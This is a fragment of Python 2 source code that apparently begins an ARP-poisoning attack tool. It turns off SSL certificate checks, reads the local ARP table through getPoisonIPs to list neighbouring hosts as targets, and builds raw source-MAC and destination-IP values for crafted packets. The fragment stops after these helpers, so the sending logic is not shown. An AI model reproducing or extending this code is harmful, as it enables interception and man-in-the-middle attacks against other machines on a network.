import re,socket,subprocess,os,sys,urllib2,urllib,ctypes,time,threading,random,itertools,platform,multiprocessing,subprocess,fcntl,select,ssl,json
from string import letters,split,rstrip
from binascii import unhexlify
from base64 import b64decode
from uuid import getnode
from sys import argv
from struct import *
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
def getPoisonIPs():
    myip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != myip:
                poison.append((x[0], x[3]))
    return poison

def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)


def create_dst_ip_addr():
    dst_ip_addr = ''
    ip_src_dec = argv[2].split(".")
    for i in range(len(ip_src_dec)):
        dst_ip_addr += chr(int(ip_src_dec[i]))
    return dst_ip_addr

